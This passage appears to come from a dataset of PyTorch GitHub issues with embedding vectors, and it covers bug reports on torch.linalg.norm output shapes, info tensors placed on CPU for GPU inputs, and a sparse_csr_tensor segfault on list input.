 -6.74890429e-02  1.75874680e-01  5.89887202e-02 -1.47410631e-01
  8.33274201e-02 -2.39337176e-01 -2.78165728e-01  5.09099841e-01
  3.34787101e-01  1.44465595e-01  4.82496023e-01 -1.85879506e-02
 -2.19766587e-01  3.32764208e-01  5.85894920e-02  1.59030572e-01
  5.91743328e-02  1.69999152e-03  1.96916059e-01 -1.91253558e-01
 -5.57885841e-02  4.46759611e-01  1.14098899e-02 -1.81832686e-01
  2.49234736e-01 -1.33538723e-01 -3.83860886e-01 -1.54608727e-01
 -2.55077183e-01  2.04743147e-01 -1.08761974e-01 -1.37949526e-01
  2.91554213e-01 -1.09759659e-01  1.72201902e-01  1.54768780e-01
 -1.24322064e-02 -2.35828012e-01 -2.46788979e-01  6.53764725e-01
 -8.31044391e-02  1.41823277e-01  2.66223699e-02  2.75071226e-02
 -8.39510635e-02  3.49222034e-01  3.96127909e-01 -1.71178192e-01
  1.60678774e-01 -2.88572609e-01 -4.65345472e-01 -4.57654715e-01
 -2.94096284e-02 -1.47331476e-01 -1.40493840e-01 -5.35285212e-02
  2.55649965e-02  9.69062671e-02  3.67173314e-01  9.43089277e-02
 -2.91591942e-01  3.53552401e-04  1.51456028e-01  9.45303366e-02
  2.62956262e-01  2.29766726e-01 -2.19665080e-01 -1.56803370e-01
 -7.93049335e-02 -1.53715268e-01 -3.49006414e-01 -1.62497208e-01
 -7.53976554e-02 -1.20643228e-01 -1.85106814e-01 -2.25245267e-01
 -1.66224718e-01  9.58027691e-03  1.19663432e-01  2.33364850e-01
  1.19518831e-01 -3.31633300e-01  1.35527104e-02 -2.05513820e-01
 -9.43488851e-02  2.41052330e-01 -1.39350623e-01  2.30118185e-01
  1.46203548e-01  1.06729325e-02 -6.47909939e-02 -1.71424508e-01
  3.42591733e-01  1.14809632e-01  3.44141781e-01  1.36326075e-01
 -1.83118820e-01 -5.03965095e-02  1.55232728e-01  2.27049753e-01
 -2.65085697e-01 -2.89996922e-01  7.59293437e-02 -4.47917730e-03
  7.05223233e-02  2.99591899e-01 -1.47391623e-02 -7.80835822e-02
 -2.51970500e-01  7.03226849e-02 -7.37998486e-02 -2.57103503e-01
  3.24549198e-01  3.12172044e-02  3.74881089e-01  4.05480802e-01
  1.11683160e-01 -9.27142948e-02  8.31767246e-02 -4.17453423e-02
  2.63484325e-02  4.49028492e-01 -1.09302886e-02  2.69351214e-01
  3.58249277e-01  1.76546797e-01 -9.73928720e-02  1.76393703e-01
 -1.57446712e-01 -5.86516857e-02 -1.83164775e-01 -5.80507338e-01
  2.46533439e-01  5.49379215e-02  3.66941035e-01 -1.19907200e-01
  2.56250739e-01 -7.02745914e-02  7.95940310e-03 -2.19107598e-01
  4.79844391e-01  2.80597925e-01 -5.51607758e-02  2.62142420e-01
  6.16536066e-02 -1.30816907e-01 -1.19417153e-01 -1.88467741e-01
 -3.25309217e-01 -1.54825836e-01 -2.05756307e-01  9.59003866e-02
  4.69573647e-01  9.39812213e-02 -4.08134192e-01  2.07636893e-01
 -2.42944658e-02 -3.39184046e-01 -5.20829558e-02  1.02780201e-01
 -6.18054986e-01 -1.32402092e-01  1.29895583e-01 -2.64496684e-01
 -2.00772107e-01 -5.22271022e-02  3.11177611e-01  6.70980066e-02
  3.27115864e-01 -8.40849757e-01  2.72365868e-01  1.98085785e-01
  2.10433990e-01  1.88783467e-01  1.17208086e-01  1.67341113e-01
 -7.14599490e-02  4.95774925e-01  2.20727652e-01  2.31355205e-02
  1.51532203e-01 -1.17878862e-01 -1.92948684e-01 -5.43495566e-02
 -4.62462977e-02  2.05820426e-01 -3.14609468e-01  2.18174849e-02
 -9.88700613e-02  1.15105204e-01  1.92398518e-01  6.39896989e-02
  1.89956784e-01 -2.57530481e-01  1.79666057e-02 -8.89810771e-02
 -1.18547752e-01  4.68240768e-01 -1.59758367e-02 -1.54666707e-01
 -3.16435546e-01  4.40078005e-02 -1.80692375e-01 -1.75109923e-01
 -2.41965845e-01 -2.45159715e-01  1.73357546e-01  8.11517239e-02
 -2.48141482e-01 -1.27317190e-01  6.41444921e-02 -1.15618080e-01
 -4.48259115e-01  1.79822147e-02 -8.64221156e-03  2.80363500e-01
  1.49317354e-01 -9.74012762e-02  2.24654466e-01  2.27088407e-01
 -4.98464823e-01  1.10076472e-01 -2.11831808e-01 -6.10760450e-02
 -1.10271081e-01 -3.39129083e-02 -4.03325677e-01 -2.58012056e-01
 -1.66955441e-02  3.22765648e-01 -1.84476525e-01  3.24613392e-01
 -4.64882880e-01 -2.70062555e-02  2.99754798e-01 -1.14975266e-01
 -2.33921975e-01 -2.43562400e-01  1.84456795e-01 -3.07349980e-01
 -1.58158280e-02  1.39180511e-01  3.65372330e-01 -3.76996040e-01]"
Output shape of `torch.linalg.norm` diverges from numpy equivalent in edge case. high priority triaged module: linear algebra module: norms and normalization,"## ðŸ› Bug

Output shape of `torch.linalg.norm` diverges from numpy equivalent in edge case.

## To Reproduce

```python
import torch
import numpy as np

t = torch.rand((1, 1, 0))
a = t.numpy()

t_norm = torch.linalg.norm(t, ord=2, dim=(0, 1), keepdim=False)
a_norm = np.linalg.norm(a, ord=2, axis=(0, 1), keepdims=False)

assert t_norm.shape == a_norm.shape
```

- This also fails for `ord=-2` but works for all other orders
- This works fine for `keepdim=True`
- This also works fine for other degenerate input shapes 

## Environment

```
PyTorch version: 1.9.0a0+gitc9de3e3
Is debug build: True
CUDA used to build PyTorch: Could not collect
ROCM used to build PyTorch: N/A

OS: Arch Linux (x86_64)
GCC version: (crosstool-NG 1.24.0.133_b0863d8_dirty) 9.3.0
Clang version: Could not collect
CMake version: version 3.20.2
Libc version: glibc-2.9

Python version: 3.6 (64-bit runtime)
Python platform: Linux-5.12.5-arch1-1-x86_64-with-arch
Is CUDA available: False
CUDA runtime version: 11.1.105
GPU models and configuration: GPU 0: NVIDIA GeForce GTX 1080
Nvidia driver version: 465.31
cuDNN version: Probably one of the following:
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_adv_infer.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_adv_train.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_cnn_infer.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_cnn_train.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_ops_infer.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_ops_train.so.8.1.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.5
[pip3] pytest-pytorch==0.0.0
[pip3] torch==1.9.0a0+gitc9de3e3
[conda] magma-cuda111             2.5.2                         1    pytorch
[conda] mkl                       2021.2.0           h726a3e6_389    conda-forge
[conda] mkl-include               2021.2.0           h726a3e6_389    conda-forge
[conda] numpy                     1.19.5           py36h2aa4a07_1    conda-forge
[conda] pytest-pytorch            0.2.0              pyh44b312d_0    conda-forge
[conda] torch                     1.9.0a0+gitc9de3e3           dev_0    <develop>
```

## Additional context

This is tested in 

https://github.com/pytorch/pytorch/blob/6d45d7a6c331ddb856ac34a76bcd3613aa05185b/test/test_linalg.py#L1928

but the test never failed due to a bug in the underlying comparison mechanism. #59067 will disable the failing test case, but it should be reinstated as soon as this issue is fixed.


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano @VitalyFedyunin",True,"[-0.33906633 -0.04778247  0.02230179 -0.11791667 -0.08746352 -0.1214963
  0.07715032  0.1566259  -0.24627487 -0.00131759 -0.20990048  0.14235201
  0.19269791  0.20516665  0.16333786  0.01599498 -0.476776   -0.0309987
 -0.3959705  -0.1803574   0.34904706 -0.08127688 -0.09651379 -0.11523988
  0.01960039  0.03209905 -0.01510575 -0.21640384  0.5258552  -0.2207138
 -0.2658286  -0.11527805 -0.5235827   0.27365452 -0.02355647  0.05576174
 -0.40226483  0.0399975  -0.39917612  0.11127686  0.08592938  0.06385105
  0.02529614 -0.22679582 -0.00686234  0.10998504 -0.03631365  0.09547379
 -0.00878064  0.12907644 -0.06918891  0.38150072 -0.03443934 -0.1864931
  0.05869956 -0.00500485 -0.17065474  0.02518031  0.14731953 -0.41774726
 -0.00889317  0.13585661 -0.22060637 -0.09605933  0.30093378 -0.18335003
  0.00662378  0.41791177  0.30466056 -0.03442769  0.03665064  0.02043656
 -0.25951403 -0.09453046 -0.04978666 -0.01249078 -0.12984593  0.16555448
 -0.3545386  -0.13137731 -0.15836748  0.19988693 -0.02227383 -0.09026544
 -0.05628586  0.03109593  0.17862904 -0.00248252  0.25460252 -0.03428667
  0.3007438  -0.22039863 -0.18715803  0.29197133  0.18565646  0.24126728
  0.38373482 -0.21667466 -0.11709031 -0.17870821 -0.18366838 -0.4197636
 -0.18907872  0.38737184  0.14201365 -0.11035924 -0.03591421  0.18497232
  0.24211825  0.01727231  0.34305343  0.0112328   0.11580843 -0.0944103
 -0.06481269 -0.45238438 -0.07899763 -0.02938463 -0.05305354  0.07114548
  0.1476939   0.19872378  0.04914425  0.37814295  0.218898    0.16643654
  0.2537509  -0.14325552 -0.10659141  0.23716338  0.07098653  0.09179875
 -0.13101424 -0.02774417  0.2542285   0.24547027 -0.4285034   0.44235462
 -0.08493993  0.02200592 -0.4108215  -0.28415772 -0.40314943 -0.2467582
  0.41171086 -0.01536277 -0.29459357  0.07708174 -0.04888637  0.08506449
  0.1007137  -0.08770879 -0.361198    0.09788714  0.14124614 -0.02412735
  0.01778673 -0.05414991  0.4932735  -0.32794234  0.18040065  0.16323662
  0.41274968  0.0771701   0.24839865  0.23816067 -0.2780796   0.00887003
 -0.27381176  0.16747917  0.39222506 -0.07433643 -0.2538215   0.00220736
  0.4447857  -0.14956787 -0.40406948 -0.5502476  -0.0361999   0.43854964
  0.3862874   0.38202935  0.3375125   0.07104605 -0.07378408 -0.16827543
  0.4455236  -0.03904801 -0.10343285 -0.01584172 -0.03571193 -0.5319902
  0.25449166 -0.06872584 -0.09010116 -0.0357106   0.05563467  0.0850108
 -0.06607456  0.11608966 -0.38965333  0.07524925  0.18996654 -0.06755754
  0.44116023  0.24142289  0.00298183 -0.6586329  -0.30023807  0.43775773
 -0.24873959 -0.3854641   0.09633681 -0.20560053 -0.0374429   0.12771767
 -0.29326478 -0.2355372  -0.07073198  0.10561521  0.22813153  0.01786346
  0.03524607 -0.16999155  0.12623805  0.38265818 -0.3005764  -0.00341968
  0.21114276 -0.07533155  0.17714252  0.00369404  0.06459769  0.1289025
  0.18831104  0.15355347 -0.01713923  0.04367679  0.03784284 -0.07959084
  0.07492585  0.03126953  0.146755   -0.23300308 -0.26797402  0.26933894
 -0.15641272 -0.16398135 -0.354673   -0.01169444 -0.26627046 -0.03545779
 -0.17731994 -0.10593712  0.2819289   0.09034276 -0.03493129  0.01808434
 -0.15748562 -0.06239009  0.11479831  0.40500203 -0.22518311  0.44176129
 -0.03362134  0.02082794  0.11677992  0.2741413  -0.02732097 -0.07424957
  0.027929   -0.298504    0.28073227  0.04227966  0.22764191 -0.37997413
  0.26310807 -0.22252953  0.02760049 -0.2686417  -0.16452979  0.15354368
 -0.22011311  0.20763081  0.31614986 -0.14983287 -0.04850626  0.02466063
 -0.11396395 -0.06368666 -0.3160981  -0.04925544  0.2203134  -0.3885336
 -0.3446459   0.05563623  0.24000934 -0.11277317  0.01125298 -0.22716953
  0.21704131  0.3860287   0.26319876 -0.02746697 -0.03603745 -0.08884801
  0.07573111  0.15358944  0.31022084 -0.23726533  0.3011243  -0.17325369
 -0.23135665  0.11518643  0.01758846  0.07778434  0.16829616  0.24097826
  0.30424926  0.03456931 -0.31884393 -0.35809726 -0.3879962  -0.18867883
 -0.09961438  0.31556857 -0.09426516  0.03506615 -0.2463635   0.13076545
 -0.14667535  0.03032154 -0.0113052   0.1768188   0.07340994 -0.04871904
 -0.08491164  0.34299815  0.02213603 -0.1315507   0.00183391  0.04477591
  0.02998777 -0.21270117 -0.11343582 -0.11862123 -0.06154858 -0.22579348
  0.09204266  0.05106452  0.12502441 -0.03898241 -0.03440252  0.37175775
 -0.01727877  0.21988277 -0.09802906  0.00985558 -0.15078866  0.35651475
  0.14228013  0.3406815  -0.1457705  -0.18897611 -0.18447174 -0.04335389
  0.22998531 -0.2858016  -0.04515541  0.33800682  0.02544648  0.19858944
  0.0654645   0.3962705   0.22451292 -0.25817746  0.17350066 -0.00510706
  0.14909552 -0.0823644  -0.30283773  0.10877128 -0.15680689 -0.05095343]"
torch.linalg.* might put the info tensor on CPU even for inputs on GPU high priority triaged module: linear algebra module: magma,"## ðŸ› Bug

For instance, MAGMA build without cuSOLVER torch.linalg.inv_ex might put the info tensor on CPU even for inputs on GPU. Opening a bug report, since there are other sections in BatchLinearAlgebra.cu where tensors are moved to CPU, which needs re-evaluation. 

## To Reproduce

Steps to reproduce the behavior:
See https://github.com/pytorch/pytorch/blob/b0833533a779d656cd6e9f6d103956ff105e7ef5/aten/src/ATen/native/cuda/BatchLinearAlgebra.cu#L1417
See discussion at: 
https://github.com/pytorch/pytorch/commit/a49406b33136a8c12503d00b1410e5596e19aede#r50939460

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->
## Error seen
was unskipping test_cond* for HIP and MAGMA, when this happened: 
=====================================================================
22:54:39 ERROR [0.065s]: test_cond_cuda_complex128 (main.TestLinalgCUDA)
22:54:39 ----------------------------------------------------------------------
22:54:39 Traceback (most recent call last):
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_utils.py"", line 1033, in wrapper
22:54:39 method(*args, **kwargs)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 297, in instantiated_test
22:54:39 raise rte
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 292, in instantiated_test
22:54:39 result = test_fn(self, *args)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 617, in dep_fn
22:54:39 return fn(slf, device, *args, **kwargs)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 617, in dep_fn
22:54:39 return fn(slf, device, *args, **kwargs)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 617, in dep_fn
22:54:39 return fn(slf, device, *args, **kwargs)
22:54:39 File ""test_linalg.py"", line 1576, in test_cond
22:54:39 run_test_case(input, p)
22:54:39 File ""test_linalg.py"", line 1560, in run_test_case
22:54:39 result = torch.linalg.cond(input, p)
22:54:39 RuntimeError: expected self and mask to be on the same device, but got mask on cpu and self on cuda:0
22:54:39

## Expected behavior

Removing info to CPU removed the issue for this case: 
https://github.com/pytorch/pytorch/pull/58232 

There seems to be other sections of code where tensors are moved explicitly to CPU. 



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano",True,"[-3.63528371e-01 -2.63911963e-01 -1.92964047e-01  2.75428519e-02
 -2.57476240e-01 -3.72902572e-01 -2.97897220e-01 -1.24539718e-01
 -9.05135497e-02 -2.25103617e-01 -6.07235059e-02  1.58882186e-01
 -2.71942645e-01 -1.74081594e-01 -1.15771860e-01 -1.34716723e-02
 -5.42493388e-02  1.83038920e-01 -1.98299900e-01 -1.80359393e-01
 -7.23738000e-02 -1.23949535e-01 -3.83875489e-01  4.47103530e-02
  3.76344562e-01  9.02338102e-02 -1.98468417e-02 -6.80636466e-02
  2.89377332e-01 -2.12049082e-01  2.35252678e-01 -3.19362059e-03
  1.37889395e-02 -6.36446197e-03 -1.31087765e-01  2.97480285e-01
 -2.16962487e-01 -2.77781427e-01 -2.92117894e-01 -9.81967747e-02
  1.53619543e-01  6.54498860e-02  1.55960321e-01  2.24385604e-01
 -4.12781350e-03 -1.52133346e-01  2.43761122e-01 -7.14677125e-02
 -3.23736697e-01 -1.09974071e-01 -2.43453681e-01 -9.77055579e-02
 -1.42353937e-01 -2.77777195e-01 -3.27183530e-02 -1.87318593e-01
  4.89905179e-01 -2.40239371e-02 -1.28578216e-01 -2.99883425e-01
  1.17796451e-01 -2.58093886e-02  1.53193444e-01 -8.32269490e-02
  9.32653099e-02  1.33370087e-01  3.01012605e-01  6.53189570e-02
  5.11484861e-01  1.29380614e-01  3.83999705e-01  2.47263834e-02
 -2.56274879e-01 -2.87991047e-01  2.83581279e-02  1.53524563e-01
 -1.28197163e-01  3.37801635e-01  2.45875299e-01  5.78547381e-02
  2.14332446e-01  6.64424375e-02  7.08612502e-02 -2.22174972e-01
  2.76919574e-01  2.48247012e-01  2.95112431e-01  1.03421733e-01
  2.31734961e-01 -3.15569401e-01  2.58424014e-01  1.53506175e-04
 -2.16301624e-02 -1.79217845e-01  2.59754568e-01  2.31943205e-01
  2.43144229e-01 -3.02101113e-02 -1.57050297e-01 -3.01266819e-01
 -3.23189169e-01 -3.04491490e-01 -1.48077846e-01  4.12478834e-01
 -7.19796643e-02  3.52504998e-02  1.88341200e-01  4.01118040e-01
 -1.52310371e-01 -3.55057836e-01  4.13822770e-01  1.23769045e-01
  1.03784889e-01  3.21202464e-02  2.42354393e-01 -3.31650615e-01
 -7.89630972e-03  6.96810037e-02 -1.06605150e-01  2.98490673e-01
  2.06919368e-02 -4.23321091e-02  1.21587835e-01  2.56404221e-01
  3.24512184e-01  4.22620624e-02 -1.38908476e-01  8.51123482e-02
  9.36010852e-04  5.66085614e-02  1.22885108e-01 -6.42855614e-02
  1.75913081e-01 -1.89676061e-01  1.63731143e-01  4.55604345e-02
 -2.28539944e-01  7.57173151e-02 -8.45667794e-02  7.14578703e-02
 -4.99798954e-02  2.29041189e-01 -2.14946613e-01 -1.42915547e-01
  2.99858242e-01  2.24828988e-01 -9.67727005e-02 -1.87090114e-01
  1.79358155e-01  8.66064727e-02 -1.88080251e-01 -2.39302553e-02
 -1.26308441e-01  2.45859861e-01  1.50071308e-01  5.40957078e-02
 -1.93203717e-01 -5.12952060e-02  2.21690416e-01 -4.61761177e-01
 -1.64417341e-01  3.70991886e-01 -1.43907052e-02  1.68436974e-01
  1.98339403e-01  2.93309867e-01 -2.12791413e-01  3.43411639e-02
  7.15599656e-02  1.97710007e-01 -1.31964549e-01 -1.36116251e-01
 -6.14878498e-02  1.39052719e-01  2.06514150e-01 -1.28813624e-01
  1.34236263e-02 -6.35626793e-01 -9.14028585e-02  4.00925428e-01
  2.57070959e-01  1.73857301e-01  3.61464292e-01  2.29257926e-01
 -2.17108689e-02  2.14357544e-02  4.43937570e-01  6.91929087e-02
 -3.10179353e-01 -3.13248068e-01 -3.37010533e-01 -1.09795906e-01
 -1.53434813e-01 -2.68035471e-01 -9.68205109e-02  6.16226420e-02
  1.46678776e-01  2.02570617e-01 -3.02951962e-01  1.37055874e-01
 -2.63173163e-01 -2.10689127e-01 -1.34286791e-01  1.63159836e-02
 -8.16678703e-02 -7.57374614e-02 -3.54646474e-01 -1.28440678e-01
 -3.07193279e-01  1.67646050e-01 -1.10058799e-01 -1.80514231e-01
  1.08119167e-01  5.93982786e-02 -6.05897047e-02  4.11612391e-02
 -1.51749432e-01 -2.12161392e-02 -7.13173524e-02  2.84599006e-01
  3.63623619e-01 -6.78801090e-02 -5.92873208e-02 -2.04989135e-01
 -2.54175842e-01 -2.15386868e-01 -9.16732550e-02  1.73451677e-02
 -1.12534910e-01  9.01197940e-02 -1.00495167e-01 -2.30736166e-01
  1.42787904e-01  2.34059263e-02  2.05378070e-01  2.65547484e-01
 -9.84646082e-02 -3.49623859e-01 -4.05856632e-02  3.33146542e-01
 -2.87886351e-01 -2.62124389e-01  1.03625998e-01  1.22941956e-01
 -1.55010015e-01  1.36087567e-01 -1.84976578e-01 -5.36493398e-03
 -1.88438118e-01  2.92076260e-01  1.44894600e-01 -3.15308690e-01
  2.61969659e-02 -2.39738487e-02  1.27669021e-01  4.29891199e-02
 -1.66097015e-01  1.13809042e-01 -2.02169269e-01  1.26876324e-01
  2.33643740e-01  1.85075417e-01 -1.76842332e-01  5.85236192e-01
  4.18534786e-01  3.62751037e-01 -3.14792842e-02  2.46940136e-01
 -2.67524540e-01  7.01154470e-02  1.32999003e-01 -1.38011843e-01
  8.08358416e-02 -1.65827990e-01  4.10442233e-01 -2.71815181e-01
  4.33616817e-01  1.12308562e-02 -1.37649909e-01 -9.55970138e-02
  2.53169894e-01  1.90356448e-01 -2.12728262e-01  1.94097191e-01
  1.32631540e-01 -2.84269869e-01 -1.02530017e-01 -2.04106525e-01
 -2.63865709e-01 -1.58280373e-01 -6.19405270e-01  2.15535313e-02
  2.65734315e-01 -3.00425231e-01 -8.68102759e-02 -1.48102921e-02
  2.57384449e-01  1.79090381e-01 -7.89426789e-02 -2.22956464e-01
 -2.55065024e-01 -1.40715808e-01  5.24782613e-02 -2.04996109e-01
 -2.92920768e-01 -1.13139302e-01  2.19058648e-01 -5.61802238e-02
  4.98377442e-01 -2.75248736e-01  2.13090301e-01  1.47671193e-01
  3.71035077e-02 -2.78368630e-02 -3.02496910e-01  1.10586956e-01
 -1.67617396e-01  4.12793636e-01  1.27964899e-01  1.03616789e-02
  1.06028311e-01 -1.86042443e-01 -2.04618663e-01  1.68896943e-01
 -8.72406885e-02 -6.72108084e-02 -1.82308495e-01  2.17220306e-01
 -1.93524987e-01  1.17007487e-01 -6.53238818e-02 -9.48426574e-02
 -1.02840558e-01 -4.72328328e-02 -1.00608945e-01  1.32337123e-01
  7.52615631e-02  2.36690938e-01 -3.87877673e-02 -3.64395052e-01
 -1.76484287e-01  2.13974774e-01  1.07202400e-02 -1.25387192e-01
 -2.02521756e-01 -1.09520912e-01  4.57423776e-01  4.34186369e-01
  2.08859906e-01  1.61527097e-01 -2.88632989e-01 -1.48329530e-02
 -2.06025302e-01  9.53411907e-02  9.50645804e-02  5.13467193e-01
 -3.10592130e-02  5.13929129e-02  3.04397583e-01  2.91304439e-01
 -8.26296359e-02  9.16362107e-02 -2.07096905e-01 -8.25855285e-02
  1.03687719e-02 -5.56978956e-02 -2.33261362e-02 -2.90681779e-01
  3.47597808e-01  4.00426745e-01 -1.41583532e-01  2.59650588e-01
 -1.10215023e-01  2.03092799e-01  3.78984272e-01 -1.31098464e-01
 -1.24252565e-01 -2.29176193e-01  9.48707312e-02 -1.60352483e-01
  1.26197532e-01  4.58393022e-02 -1.62635930e-02 -2.10532144e-01]"
sparse_csr_tensor input sanitization high priority triage review module: sparse module: crash triaged,"## ðŸ› Bug

If given a regular Python list the constructor segfaults. This is minor, but annoying to debug.

## To Reproduce

```
import torch

values = torch.tensor([1., 2., 3., 1., 2., 3., 4., 1., 2.])
crow_indices = [0, 3, 7, 9] # Python list instead of torch Tensor!
col_indices = torch.tensor([0, 1, 2, 0, 1, 2, 3, 0, 1])
size = (3, 4)

torch.sparse_csr_tensor(crow_indices,
                        col_indices,
                        values,
                        size)
```
## Expected behavior

TypeError that flags a wrong type was passed.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @aocsa @nikitaved @pearu @mruberry",True,"[-1.55505955e-01 -3.04078251e-01 -2.83549309e-01  5.59437424e-02
  1.19671807e-01 -2.42868870e-01  1.69166446e-01 -2.11536046e-02
 -4.78568524e-01 -1.71369821e-01 -1.33699000e-01  4.27262783e-02
 -3.43024135e-01  2.75731564e-01 -2.42659658e-01  1.10836528e-01
 -6.07191995e-02 -1.51867941e-01 -9.83197093e-02 -1.61794171e-01
  2.76788712e-01 -4.01119590e-02 -3.04461718e-01  2.28519365e-01
  5.70296347e-02  1.79670677e-01 -1.35026395e-01 -2.02081457e-01
  2.89927930e-01  9.68043804e-02  9.06807091e-03 -4.11223583e-02
 -2.50157654e-01 -2.35821158e-02  5.71437292e-02  1.54729605e-01
 -1.43726274e-01 -8.51293951e-02 -1.82585090e-01 -9.89640057e-02
  3.19896303e-02  1.73080146e-01  4.49668281e-02  1.46517873e-01
 -1.87961645e-02  1.10215709e-01 -6.07446656e-02  2.70583294e-02
 -1.64084658e-01 -7.49200135e-02 -1.38318002e-01  1.77049190e-01
 -3.51393044e-01 -3.55587482e-01  1.08466186e-01 -3.72793198e-01
  8.98471177e-02 -1.96109474e-01  4.52794358e-02 -5.07067382e-01
 -2.17328146e-02 -1.40614137e-02 -3.12321410e-02  2.33228058e-01
  5.72168045e-02  1.01199590e-01  1.41645014e-01  7.82839358e-02
  4.37861323e-01  1.78098053e-01  3.37752640e-01  5.99512607e-02
 -2.44346619e-01  5.79586253e-02 -1.44727722e-01  7.71623850e-02
 -1.50008038e-01  1.25111341e-01  5.70952445e-02 -1.19079866e-01
  6.80899769e-02  2.09084600e-02  6.63852021e-02 -2.89739043e-01
  2.97306091e-01  5.13987541e-02  3.80138785e-01  2.06052154e-01
  3.83264035e-01  3.46036702e-02  4.84605134e-01  1.55011147e-01
 -1.87562257e-02  1.42778352e-01 -5.69762215e-02  1.19860396e-02
  5.17314553e-01 -1.48734257e-01 -1.76145226e-01 -1.66204631e-01
 -3.66064548e-01 -3.21936369e-01 -6.11657351e-02  2.52307653e-01
  1.57591656e-01  1.98327214e-01  1.72439218e-01  6.76265657e-02
  1.02944739e-01 -9.10021514e-02  2.42328063e-01  1.54979557e-01
  1.76351547e-01 -1.15932085e-01  1.59659795e-02 -1.50517792e-01
 -9.14250985e-02  7.66946152e-02  2.31015235e-01  5.40650606e-01
  7.92650059e-02  2.01401040e-01  1.17655002e-01  4.12507355e-01
  4.27307963e-01  2.38675147e-01 -1.47021890e-01 -1.07578821e-02
  4.01646905e-02  5.22897840e-02  9.94051844e-02 -4.89261784e-02
 -2.40059584e-01  1.50825933e-01  2.27254570e-01  1.56337649e-01
 -3.78291488e-01 -1.82721928e-01 -1.50823355e-01  2.29166541e-02
 -1.34205297e-01  9.89683270e-02 -1.24299988e-01 -3.11862648e-01
  3.47896904e-01  1.96550667e-01 -3.88605237e-01 -1.76454298e-02
 -2.36054182e-01  2.93650717e-01 -1.23711586e-01 -6.80832192e-04
 -3.19578767e-01  2.12870479e-01 -5.08811325e-03  1.95860658e-02
  2.00625900e-02  2.08962038e-02  1.35928467e-01 -3.38174522e-01
  1.31919429e-01  3.64329398e-01  2.35506389e-02 -2.56664567e-02
  1.95894480e-01  1.67472735e-01 -2.58697689e-01 -6.10862598e-02
 -3.20599675e-01  1.84529871e-01  1.78038348e-02 -2.36211509e-01
 -3.34888339e-01 -1.44109741e-01  2.22246081e-01 -1.15388215e-01
 -1.43676132e-01 -8.09185028e-01 -1.00400575e-01  1.12977341e-01
  1.45990998e-01  2.16095135e-01  6.23207986e-02 -7.34258257e-03
 -4.14947383e-02 -1.19661450e-01  3.88443649e-01 -8.36297199e-02
 -9.69121903e-02 -7.28154555e-03 -2.92919070e-01 -5.13364196e-01
  5.16068459e-01 -1.26517013e-01  2.22368136e-01  1.72664240e-01
 -1.02959611e-02 -2.00486809e-01 -1.75418586e-01 -7.92336166e-02
  6.24002479e-02 -4.28098381e-01 -4.44439985e-03 -1.40426653e-02
  2.73335576e-01 -1.74912289e-01 -3.27547491e-01 -4.88648623e-01
 -2.95161843e-01  1.81973875e-01  4.69209161e-04 -3.59861970e-01
 -2.04899818e-01 -1.84532866e-01 -8.94065052e-02  1.38336584e-01
 -6.57811910e-02 -7.37634599e-02 -1.99911535e-01  5.57918176e-02
  4.02644932e-01 -5.58933914e-02 -4.85828146e-02 -3.28883111e-01
 -4.86585908e-02 -2.45357648e-01 -1.73851401e-01 -7.39709139e-02
 -2.94992685e-01  5.24898022e-02 -9.81532410e-03 -3.45386118e-01
  1.19749196e-01 -2.05343291e-02  7.85238445e-02  1.78861082e-01
 -1.76106602e-01 -1.98468715e-01  9.08783898e-02  4.72320616e-01
 -3.47649366e-01  1.23018809e-01  3.90515625e-02 -3.22271258e-01
 -1.31074041e-01  2.86191165e-01 -1.52664371e-02 -1.04227677e-01
 -3.76312882e-01  3.17828536e-01 -2.62257643e-02  1.30084813e-01
  2.23509401e-01  1.13468636e-02  3.75468165e-01 -2.35783793e-02
 -2.55961716e-02  1.78103875e-02  2.19014008e-02 -6.54518232e-03
  2.65256315e-01  1.10566720e-01  2.08486859e-02  6.55466855e-01
  1.67702973e-01  3.10048610e-01  1.00872107e-03  4.47750568e-01
  6.38394654e-02 -1.69782534e-01 -1.10442147e-01 -7.85079300e-02
  3.56297910e-01 -1.11736603e-01 -4.35447618e-02 -3.22654366e-01
  5.45833334e-02  6.58039153e-02 -2.11426422e-01 -1.25706851e-01
  1.77074939e-01  2.45915145e-01 -1.91235319e-01  4.37184334e-01
 -1.60514424e-03 -1.81925297e-01 -1.65316120e-01 -2.06319124e-01
  6.41792864e-02  1.18776552e-01 -3.49820763e-01  1.19479045e-01
  5.58140874e-01 -2.91352212e-01 -2.65951157e-01  2.89919555e-01
  3.07248026e-01 -3.68308753e-01 -1.70123369e-01  1.52685910e-01
  2.03141421e-02  1.58313617e-01  1.39387667e-01 -1.35978252e-01
 -1.45908967e-02 -1.30408660e-01  3.73891115e-01  1.69240028e-01
  2.43226349e-01 -3.10065866e-01  2.24124819e-01 -2.15441883e-02
 -3.89329791e-02  1.48295760e-01 -5.41999340e-02  4.66182269e-02
  3.74282263e-02  5.80685377e-01  3.82591903e-01 -1.08768120e-02
 -1.32224143e-01 -5.09067290e-02 -2.67263502e-01  1.21309936e-01
  3.04322876e-02 -4.41059321e-02 -2.28051662e-01 -5.05978763e-02
